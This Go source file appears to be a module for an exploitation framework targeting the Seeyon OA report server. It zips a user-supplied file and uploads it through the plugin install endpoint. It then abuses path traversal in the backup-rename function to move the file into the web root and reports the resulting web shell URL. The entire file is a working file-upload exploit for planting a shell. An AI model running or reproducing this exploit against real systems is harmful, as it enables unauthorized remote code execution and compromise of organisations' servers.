package exp_seeyonOA

import (
	"archive/zip"
	"bytes"
	"fmt"
	"github.com/lz520520/railgunlib/pkg/goutils"
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"github.com/lz520520/railgunlib/pkg/utils/lznet/lzhttp"
)

type Exp_ReportServer struct {
	exp_templates.ExpTemplate
}

func (self *Exp_ReportServer) Attack_upload1() (expResult exp_model.ExpResult) {
	filename := self.MustGetStringParam("filename")
	content := self.MustGetStringParam("content")
	// 默认配置
	headers := self.GetInitExpHeaders()

	// 构造payload
	target := goutils.AppendUri(self.Params.BaseParam.Target, "/seeyonreport/ReportServer?op=plugin&cmd=local_install")

	// zip压缩xml和shell
	b := &bytes.Buffer{}
	zw := zip.NewWriter(b)

	iowriter, _ := zw.Create(filename)
	iowriter.Write([]byte(content))
	zw.Flush()
	zw.Close()

	// 发送请求
	multiParts := []lzhttp.PostMultiPart{
		{
			FieldName:   "file",
			FileName:    goutils.GetBaseName(filename) + ".zip",
			ContentType: "application/x-zip-compressed",
			Content:     b.Bytes(),
		},
	}
	httpresp := self.HttpPostMulti(target, multiParts, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	if httpresp.Resp.StatusCode != 200 {
		self.EchoErrMsg("上传失败")
		return
	}

	targe2 := goutils.AppendUri(self.Params.BaseParam.Target, fmt.Sprintf("/seeyonreport/ReportServer?op=fr_server&cmd=manual_backup&optype=edit_backup&oldname=../../tmp/%s&newname=../../../%s", filename, filename))
	httpresp = self.HttpGetWithoutRedirect(targe2, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}

	if httpresp.Resp.StatusCode != 200 {
		self.EchoErrMsg("迁移文件失败")
		return
	}

	shellUrl := goutils.AppendUri(self.Params.BaseParam.Target, "/seeyonreport/"+filename)
	httpresp = self.HttpGetWithoutRedirect(shellUrl, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	expResult.RawResult = httpresp.RawFullResp

	if httpresp.Resp.StatusCode == 200 {
		self.EchoSuccessMsg("shell: %s", shellUrl)
		expResult.Status = true
	}
	return
}

func init() {
	exp_register.ExpStructRegister(&Exp_ReportServer{}, "exp_ReportServer.yml")

}
